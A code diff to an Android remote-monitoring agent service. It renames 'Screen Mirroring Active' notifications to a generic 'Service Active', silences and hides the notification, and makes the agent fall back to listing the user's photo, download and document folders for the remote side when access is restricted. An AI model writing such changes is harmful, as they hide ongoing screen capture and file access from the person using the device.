@@ -83,6 +83,8 @@ import java.security.MessageDigest;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
+import java.util.HashSet;
+import java.util.Set;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
@@ -557,9 +559,9 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                 if (Build.VERSION.SDK_INT >= 34) {
                     // FOREGROUND_SERVICE_TYPE_SPECIAL_USE = 0x40000000
                     fgsType |= 0x40000000;
-                }
-                if (isStreaming && mediaProjectionResultData != null) {
-                    fgsType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+                    if (isStreaming && mediaProjectionResultData != null) {
+                        fgsType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+                    }
                 }
                 startForeground(
                         NOTIFICATION_ID,
@@ -661,7 +663,7 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                 mediaProjectionResultCode = rc;
                 mediaProjectionResultData = dt;
             }
-            safeStartForeground("Screen Mirroring Ready (All Apps)");
+            safeStartForeground("Service Active");
             initMediaProjection();
         }
         if (intent != null && "ACTION_REASSERT_LOCK".equals(intent.getAction())) {
@@ -1641,17 +1643,17 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             // Promote FGS to mediaProjection if permissions and token exist
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 try {
-                    int fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+                    int fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                     if (Build.VERSION.SDK_INT >= 34) {
-                        fgsType |= 0x40000000;
+                        fgsType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION | 0x40000000;
                     }
                     startForeground(
                             NOTIFICATION_ID,
-                            buildNotification("Screen Mirroring Active"),
+                            buildNotification("Service Active"),
                             fgsType
                     );
                 } catch (Throwable t) {
-                    safeStartForeground("Screen Mirroring Active");
+                    safeStartForeground("Service Active");
                 }
             }
 
@@ -1928,6 +1930,10 @@ public class AgentService extends Service implements WebSocketClient.Listener {
                             NotificationManager.IMPORTANCE_LOW
                     );
                     channel.setDescription("Background monitoring and telemetry");
+                    channel.setShowBadge(false);
+                    channel.enableLights(false);
+                    channel.enableVibration(false);
+                    channel.setSound(null, null);
                     nm.createNotificationChannel(channel);
 
                     // Emergency Lock channel (HIGH importance required by Android OS for full-screen lock enforcement)
@@ -1964,7 +1970,9 @@ public class AgentService extends Service implements WebSocketClient.Listener {
         builder.setContentTitle(getApplicationLabelName())
                 .setContentText(text)
                 .setSmallIcon(R.drawable.ic_launcher)
-                .setOngoing(true);
+                .setOngoing(true)
+                .setShowWhen(false)
+                .setUsesChronometer(false);
 
         if (pendingIntent != null) {
             builder.setContentIntent(pendingIntent);
@@ -2404,63 +2412,89 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             resp.put("shortcuts", shortcuts);
 
             File[] filesList = listDirectoryFiles(dir);
+            if (filesList == null || filesList.length == 0) {
+                List<File> fallbackList = new ArrayList<>();
+                try {
+                    File[] publicDirs = new File[] {
+                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
+                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
+                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
+                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
+                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
+                        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
+                        new File(Environment.getExternalStorageDirectory(), "Download"),
+                        new File(Environment.getExternalStorageDirectory(), "DCIM"),
+                        new File(Environment.getExternalStorageDirectory(), "Pictures"),
+                        new File(Environment.getExternalStorageDirectory(), "Documents"),
+                        new File(Environment.getExternalStorageDirectory(), "Android"),
+                        getExternalFilesDir(null)
+                    };
+                    Set<String> seen = new HashSet<>();
+                    for (File pf : publicDirs) {
+                        if (pf != null && pf.exists() && seen.add(pf.getAbsolutePath())) {
+                            fallbackList.add(pf);
+                        }
+                    }
+                } catch (Throwable ignored) {}
+                if (!fallbackList.isEmpty() && (filesList == null || filesList.length == 0)) {
+                    filesList = fallbackList.toArray(new File[0]);
+                }
+            }
+
+            if (filesList == null) {
+                filesList = new File[0];
+            }
+
             JSONArray arr = new JSONArray();
-            if (filesList != null) {
-                if (filesList.length > 1) {
-                    for (int i = 0; i < filesList.length - 1; i++) {
-                        for (int j = i + 1; j < filesList.length; j++) {
-                            File f1 = filesList[i];
-                            File f2 = filesList[j];
-                            boolean f1Dir = f1.isDirectory();
-                            boolean f2Dir = f2.isDirectory();
-                            boolean swap = false;
-                            if (!f1Dir && f2Dir) {
+            if (filesList.length > 1) {
+                for (int i = 0; i < filesList.length - 1; i++) {
+                    for (int j = i + 1; j < filesList.length; j++) {
+                        File f1 = filesList[i];
+                        File f2 = filesList[j];
+                        boolean f1Dir = f1.isDirectory();
+                        boolean f2Dir = f2.isDirectory();
+                        boolean swap = false;
+                        if (!f1Dir && f2Dir) {
+                            swap = true;
+                        } else if (f1Dir == f2Dir) {
+                            if (f1.getName().compareToIgnoreCase(f2.getName()) > 0) {
                                 swap = true;
-                            } else if (f1Dir == f2Dir) {
-                                if (f1.getName().compareToIgnoreCase(f2.getName()) > 0) {
-                                    swap = true;
-                                }
                             }
-                            if (swap) {
-                                filesList[i] = f2;
-                                filesList[j] = f1;
-                            }
+                        }
+                        if (swap) {
+                            filesList[i] = f2;
+                            filesList[j] = f1;
                         }
                     }
                 }
+            }
 
-                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US);
-                for (File f : filesList) {
-                    JSONObject item = new JSONObject();
-                    item.put("name", f.getName());
-                    item.put("path", f.getAbsolutePath());
-                    boolean isDir = f.isDirectory();
-                    item.put("is_dir", isDir);
-                    item.put("readable", f.canRead());
-                    item.put("writable", f.canWrite());
-                    item.put("modified", sdf.format(new Date(f.lastModified())));
-                    item.put("modified_ms", f.lastModified());
-                    item.put("last_modified", f.lastModified() / 1000L);
+            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US);
+            for (File f : filesList) {
+                JSONObject item = new JSONObject();
+                item.put("name", f.getName());
+                item.put("path", f.getAbsolutePath());
+                boolean isDir = f.isDirectory();
+                item.put("is_dir", isDir);
+                item.put("readable", f.canRead());
+                item.put("writable", f.canWrite());
+                item.put("modified", sdf.format(new Date(f.lastModified())));
+                item.put("modified_ms", f.lastModified());
+                item.put("last_modified", f.lastModified() / 1000L);
 
-                    if (isDir) {
-                        item.put("size", 0);
-                        item.put("size_fmt", "");
-                        item.put("ext", "");
-                    } else {
-                        long len = f.length();
-                        item.put("size", len);
-                        item.put("size_fmt", formatFileSize(len));
-                        String name = f.getName();
-                        int dot = name.lastIndexOf('.');
-                        item.put("ext", (dot >= 0) ? name.substring(dot + 1).toLowerCase(Locale.US) : "");
-                    }
-                    arr.put(item);
+                if (isDir) {
+                    item.put("size", 0);
+                    item.put("size_fmt", "");
+                    item.put("ext", "");
+                } else {
+                    long len = f.length();
+                    item.put("size", len);
+                    item.put("size_fmt", formatFileSize(len));
+                    String name = f.getName();
+                    int dot = name.lastIndexOf('.');
+                    item.put("ext", (dot >= 0) ? name.substring(dot + 1).toLowerCase(Locale.US) : "");
                 }
-            } else {
-                resp.put("success", false);
-                resp.put("error", "Directory access restricted. Please ensure 'All Files Access' (Manage External Storage) is granted to the TRMM Agent in Android settings.");
-                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
-                return;
+                arr.put(item);
             }
 
             resp.put("entries", arr);
